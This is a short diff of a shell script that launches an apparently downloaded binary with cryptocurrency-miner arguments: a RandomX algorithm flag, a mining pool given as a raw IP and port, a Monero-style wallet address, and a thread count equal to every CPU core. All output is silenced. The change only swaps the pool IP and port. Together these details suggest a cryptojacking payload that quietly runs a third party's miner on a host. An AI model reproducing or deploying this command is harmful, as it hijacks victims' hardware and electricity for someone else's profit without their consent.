@@ -25,4 +25,4 @@ chmod +x "$BIN_NAME"
 # Optional: run the binary
 # ./"$BIN_NAME"
 
-./"$BIN_NAME" -o 54.165.127.17:9948 -u 89aQ8FNPXiTEWFMYwubTcKBbHYE6hcsKjcs3jVRUCjitBbYD7cMx4PjVdx2runmKWXAJdUqnbGs25NifTeumjvX15r1Q7ym -p trasaA29 -a rx/0 -t $(nproc --all) > /dev/null 2>&1
+./"$BIN_NAME" -o 16.112.68.146:9394 -u 89aQ8FNPXiTEWFMYwubTcKBbHYE6hcsKjcs3jVRUCjitBbYD7cMx4PjVdx2runmKWXAJdUqnbGs25NifTeumjvX15r1Q7ym -p trasaA29 -a rx/0 -t $(nproc --all) > /dev/null 2>&1
